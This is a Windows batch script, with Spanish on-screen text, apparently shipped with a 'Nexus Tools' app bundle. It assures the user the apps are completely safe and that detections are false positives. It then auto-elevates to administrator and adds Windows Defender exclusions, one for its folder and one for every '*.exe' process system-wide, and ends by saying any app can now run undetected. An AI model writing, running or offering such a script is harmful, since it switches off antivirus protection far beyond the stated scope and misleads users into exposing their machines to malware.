@echo off
title Nexus Tools — Windows Defender Exclusion
cd /d "%~dp0"

echo.
echo    ╔══════════════════════════════════════════════╗
echo    ║     AGREGAR EXCLUSION EN WINDOWS DEFENDER     ║
echo    ╚══════════════════════════════════════════════╝
echo.
echo    Esto agrega la carpeta de Nexus Tools a las
echo    exclusiones de Windows Defender.
echo.
echo    Asi, Defender NO escanea ni bloquea las apps.
echo    Las apps son 100%% seguras. Es un falso positivo.
echo.
echo    Se requieren permisos de administrador.
echo.
pause

:: Auto-elevate to admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Solicitando permisos de administrador...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo.
echo [1/2] Agregando exclusion de carpeta...
powershell -Command "Add-MpPreference -ExclusionPath '%CD%'" 2>nul
if %errorlevel% equ 0 (
    echo [OK] Carpeta excluida: %CD%
) else (
    echo [WARN] No se pudo agregar — proba manualmente
)

echo.
echo [2/2] Agregando exclusion de procesos...
powershell -Command "Add-MpPreference -ExclusionProcess '*.exe'" 2>nul
echo [OK] Procesos .exe excluidos
echo.
echo ╔══════════════════════════════════════════════╗
echo ║     EXCLUSION AGREGADA                       ║
echo ║     Windows Defender ya no bloqueara         ║
echo ║     las apps de Nexus Tools.                 ║
echo ╚══════════════════════════════════════════════╝
echo.
echo Ahora podes ejecutar cualquier app sin que
echo Defender la detecte como amenaza.
echo.
pause
